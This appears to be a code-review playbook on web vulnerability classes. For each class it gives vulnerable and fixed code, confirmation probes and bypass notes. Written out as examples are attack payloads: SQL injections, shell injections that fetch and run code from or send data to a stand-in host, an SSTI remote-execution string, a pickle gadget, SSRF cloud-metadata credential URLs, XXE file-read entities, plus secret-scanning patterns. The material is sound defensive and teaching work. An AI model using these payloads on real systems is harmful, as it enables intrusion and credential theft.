# Vulnerability-class playbook: sources → sinks, examples, bypasses, confirmation

Each section: the class model, a vulnerable + fixed example, how to confirm,
and sanitizer-bypass notes for Step 3 judgment. Language-specific sink tables
and ripgrep one-liners live in `sinks-<lang>.md`.

## SQL injection

- **Sources**: any request field; also second-order (stored display name used
  in a later query).
- **Sinks**: query execution where the SQL *string* was built with tainted
  parts: concat, `%`/`format`/f-string/template literal/`#{}`/`Sprintf`.
  ORM escape hatches: Django `raw()/extra()`, SQLAlchemy `text()`, Rails
  string `where`/`find_by_sql`/`order(params)`, Sequelize/knex `.query/.raw`,
  Prisma `$queryRawUnsafe`, JPA/Hibernate concat `createQuery`, MyBatis `${}`,
  GORM string `Where`, Laravel `whereRaw/DB::raw`.
- **Sanitizers**: parameter binding; identifier allowlists for
  table/column/ORDER BY/LIMIT (binds can't parameterize those).

```python
# VULN (Flask + psycopg2)
@app.route("/search")
def search():
    q = request.args.get("q", "")
    cur.execute(f"SELECT id,name FROM products WHERE name LIKE '%{q}%'")
# attack: q = %'; DROP TABLE products;--      or UNION SELECT username,password FROM users--

# FIXED
    cur.execute("SELECT id,name FROM products WHERE name LIKE %s", (f"%{q}%",))
```

Confirm: single quote → SQL error / 500; `' OR '1'='1` changes result set;
time-based `'||pg_sleep(5)--` for blind. Judge "escaping" sanitizers harshly:
`addslashes` (multibyte bypass), manual quote-doubling (misses numeric
context: `WHERE id = $id` needs no quote at all).

## OS command injection

- **Sinks**: anything that reaches a shell: `os.system`, `subprocess
  shell=True`, `child_process.exec`, PHP `exec/system/...`+backticks, Ruby
  `system("...")`/`%x`/backticks/`Kernel#open("|...")`, Java
  `sh -c` ProcessBuilder, Go `exec.Command("sh","-c",...)`.
- **Sanitizers**: argv-array exec with constant binary, no shell; `--`
  separator before user args; allowlist of subcommands.

```javascript
// VULN (Express)
app.get("/dig", (req, res) => {
  exec("dig +short " + req.query.host, (e, out) => res.send(out));
});
// attack: host = example.com; cat /etc/passwd   |  $(curl 198.51.100.7/x|sh)  |  `id`

// FIXED
  execFile("dig", ["+short", "--", String(req.query.host)], (e, out) => res.send(out));
```

Confirm: `; id`, `| id`, `$(id)`, `` `id` ``, `%0aid` (newline). Argument
injection even without a shell: user value `-oProxyCommand=...` to ssh,
`--upload-file` to curl — check which binary and whether `--` is present.
Blind confirm: time (`; sleep 5`) or out-of-band (`; curl 198.51.100.7/$(id -u)`).

## Code / template injection (SSTI)

- **Sinks**: `eval/exec/Function/vm.*`, SpEL/OGNL/Groovy evaluation, and any
  template engine *compiling a string containing user data* (vs rendering
  user data as context values): `render_template_string`, `jinja2.Template`,
  `ERB.new`, `render inline:`, Twig `createTemplate`, nunjucks
  `renderString`, handlebars `compile`, Velocity `evaluate`, Thymeleaf
  fragment/expression preprocessing.
- **Sanitizers**: pass user data as template variables; sandbox modes are
  defense-in-depth only (Jinja2 sandbox and Freemarker have had escapes).

```python
# VULN (Flask)
@app.route("/hello")
def hello():
    return render_template_string("Hello " + request.args.get("name", ""))
# probe: name={{7*7}} -> "Hello 49"
# RCE:   name={{cycler.__init__.__globals__.os.popen('id').read()}}

# FIXED
    return render_template_string("Hello {{ name }}", name=request.args.get("name", ""))
```

Engine fingerprint probes: `{{7*7}}`=49 (Jinja/Twig/nunjucks), `${7*7}`
(Freemarker/SpEL-ish), `<%= 7*7 %>` (ERB/EJS), `#{7*7}` (Ruby interp),
`*{7*7}`/`__${7*7}__` (Thymeleaf).

## Insecure deserialization

- **Sinks**: `pickle.loads`, `yaml.load` (unsafe loader), `marshal`,
  `jsonpickle`, `torch.load`/`joblib.load`; Java `ObjectInputStream.readObject`,
  `XMLDecoder`, XStream default, SnakeYAML `new Yaml().load`, Jackson default
  typing; Ruby `Marshal.load`, old `YAML.load`, `Oj.load`; PHP
  `unserialize($user)` + `phar://`; Node `node-serialize`, js-yaml<4.
- **Sources with extra reach**: cookies/sessions ("remember me" blobs),
  cache entries, JWT bodies decoded then deserialized, message-queue payloads,
  uploaded "model"/"export" files.
- **Sanitizers**: JSON + schema; safe loaders; class allowlist filters
  (`ObjectInputFilter`, XStream `allowTypes`, `allowed_classes`); HMAC-sign
  the blob and verify before deserializing (key must not be guessable —
  check for default Rails `secret_key_base`, Django `SECRET_KEY`,
  Flask session key, Laravel `APP_KEY` in the repo: that's a critical on its own).

```python
# VULN
data = pickle.loads(base64.b64decode(request.cookies["session"]))
# attack payload class:
#   class P: __reduce__ = lambda s: (os.system, ("id",))
# FIXED
data = json.loads(base64.b64decode(request.cookies["session"]))  # + signature check
```

Confirm Java: classpath gadget check (commons-collections ≤3.2.1, etc. —
hand to the SCA skills), then a benign ysoserial `URLDNS` payload proves the
sink fires without executing anything.

## SSRF

- **Sinks**: HTTP clients, URL fetchers (`file_get_contents`, `URI.open`,
  `urlopen` — many also honor `file://`), webhook senders, PDF/image
  renderers fetching URLs, link-preview features, importers ("import from URL").
- **High-value targets**: `http://169.254.169.254/latest/meta-data/` (AWS;
  IMDSv1), `http://metadata.google.internal/computeMetadata/v1/` (GCP, needs
  `Metadata-Flavor: Google`), Azure IMDS, `localhost` admin ports, internal
  service mesh, `file:///etc/passwd`.
- **Sanitizers**: parse+canonicalize, host allowlist, resolve DNS and reject
  private/link-local/loopback, pin the resolved IP for the actual connect
  (anti-rebinding), re-validate every redirect hop, restrict schemes to http/https.
- **Bypass checklist** against weak validators: `http://198.51.100.7@evil`,
  decimal/octal/hex IPs (`2852039166`, `0xA9FEA9FE`), `[::ffff:169.254.169.254]`,
  trailing-dot FQDN, open-redirect chaining, DNS rebinding, `0.0.0.0`.

```python
# VULN
@app.route("/fetch")
def fetch():
    return requests.get(request.args["url"]).text
# attack: url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# FIXED (sketch)
    u = urllib.parse.urlparse(request.args["url"])
    if u.scheme not in ("http", "https") or u.hostname not in ALLOWED_HOSTS:
        abort(400)
    ip = ipaddress.ip_address(socket.getaddrinfo(u.hostname, None)[0][4][0])
    if ip.is_private or ip.is_loopback or ip.is_link_local:
        abort(400)
    # connect to the validated IP, Host header = u.hostname; redirects re-checked
```

## Path traversal / arbitrary file read-write

- **Sinks**: file open/read/write/delete/copy with user path parts; download
  endpoints (`send_file`, `sendFile`, `ServeFile`); upload destinations using
  `original_filename`; archive extraction (zip-slip: entry names like
  `../../../../root/.ssh/authorized_keys`); PHP `include` (→ RCE).
- **Sanitizers**: canonicalize then prefix-check (realpath /
  getCanonicalPath / filepath.Abs+Clean) with trailing separator; or indirect
  reference (id → server-chosen path); `basename()` when only a filename is
  expected.
- **Bypasses** of weak sanitizers: `....//` beats single-pass
  `replace("../","")`; absolute path beats `join(base, user)` (Python/Node);
  URL-encoding (`%2e%2e%2f`) when decode happens after the check; Windows
  `..\\`; NUL (`%00`) on legacy runtimes; prefix check without separator
  (`/var/data` matches `/var/data_evil`).

```java
// VULN (zip-slip)
File out = new File(destDir, entry.getName());
Files.copy(zip.getInputStream(entry), out.toPath());

// FIXED
File out = new File(destDir, entry.getName());
if (!out.getCanonicalPath().startsWith(destDir.getCanonicalPath() + File.separator))
    throw new IOException("zip-slip: " + entry.getName());
```

Write-primitives escalate: webroot/`.ssh`/cron/template dirs → RCE. Say so in
the finding.

## XXE

- **Sinks**: XML parse of user documents with DTD/external entities on. Java
  factories default-vulnerable (pre-hardening); lxml `resolve_entities=True`;
  PHP `LIBXML_NOENT`; libxmljs `noent:true`. Also SVG uploads, DOCX/XLSX
  (zipped XML), SOAP endpoints, SAML (XML sig wrapping is adjacent).
- **Payloads**: file read
  `<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>`;
  SSRF via `SYSTEM "http://192.0.2.10/"`; blind/OOB via parameter entities +
  external DTD; billion-laughs DoS.
- **Sanitizers**: disable DTDs entirely (`disallow-doctype-decl`,
  `defusedxml`, no `LIBXML_NOENT`, StAX `SUPPORT_DTD=false`).

## Authz gaps: IDOR / missing access control

- **Model**: sink = fetch/mutate keyed by request-supplied object id;
  missing sanitizer = ownership/tenancy/role check between authn and query.
- **Method**: build the route inventory, build the control inventory
  (decorators/middleware/policies), diff. Then per route: whose id? Can user
  A pass user B's id? Pay extra attention to: secondary endpoints (export,
  print, API-v1 leftovers), state-changing GETs, batch endpoints, GraphQL
  resolvers (per-field authz), websockets, and `skip_before_action` /
  `permitAll()` / routes registered outside the authed group.

```python
# VULN (Django)
def invoice(request, invoice_id):
    inv = Invoice.objects.get(id=invoice_id)        # any authenticated user, any invoice
    return render(request, "invoice.html", {"inv": inv})

# FIXED
    inv = get_object_or_404(Invoice, id=invoice_id, owner=request.user)
```

Confirm: two test identities, swap ids, compare responses. Enumerable ids
(sequential ints) raise severity; UUIDs lower exploitability but the bug is
the missing check, not the id format.

## Crypto misuse

- **Smells → trace the use**: `AES/ECB` or default `AES` in Java (ECB);
  DES/3DES/RC4/Blowfish; static IV or key literal in source; MD5/SHA1 for
  passwords (want bcrypt/scrypt/argon2 with per-user salt); unsalted fast
  hashes; non-CSPRNG for tokens/reset codes/session ids (`random`,
  `Math.random`, `java.util.Random`, `mt_rand`, `math/rand`, `uniqid`);
  TLS verification disabled; JWT `alg:none` / HS256 key = RSA pub key
  confusion / secret in repo; comparing MACs with `==` (timing).
- **Taint angle**: severity = what the weak primitive protects. Trace
  *forward* from the weak call to its consumer: `Math.random()` reset token
  mailed to users = account takeover; same call for a jitter delay = ignore.

```python
# VULN
reset_token = "".join(random.choice(string.ascii_letters) for _ in range(16))  # Mersenne Twister, seedable/predictable
# FIXED
reset_token = secrets.token_urlsafe(32)
```

## Hardcoded secrets

Manual sweep patterns are in each `sinks-<lang>.md`; the generic ones:
```
rg -n -i '(api[_-]?key|secret|passw(or)?d|token|private[_-]?key)\s*[:=>]{1,2}\s*["\x27][A-Za-z0-9+/=_\-]{8,}'
rg -n 'BEGIN (RSA|EC|OPENSSH|PGP) PRIVATE KEY'
rg -n 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|github_pat_|xox[baprs]-|sk_live_|AIza[0-9A-Za-z_\-]{35}|eyJhbGciOi'
```
For git-history breadth, entropy detection and verification, load the
**`gitleaks`** and **`trufflehog`** skills. Treat each found secret as a new
source: what does it authenticate to, and does the repo show how it's used
(endpoints, account ids)? A live cloud key found during code review changes
the engagement — report it with the access it grants.

## Severity judgment cheat-sheet

| Flow | Baseline |
|---|---|
| unauth source → RCE sink (cmdi, deser, SSTI, pickle) | critical |
| unauth source → SQLi / arbitrary file write | critical |
| authed user → RCE/SQLi | high–critical |
| SSRF reaching metadata/internal | high (critical with creds returned) |
| arbitrary file read / XXE file read | high |
| IDOR on sensitive objects | high; on cosmetic data: medium |
| weak token for authn flows | high; weak crypto at rest: medium–high |
| secret in repo | severity of the account it opens |

Downgrade when the path requires improbable config; upgrade when sources are
pre-auth, ids are enumerable, or output is directly returned (no blind work).
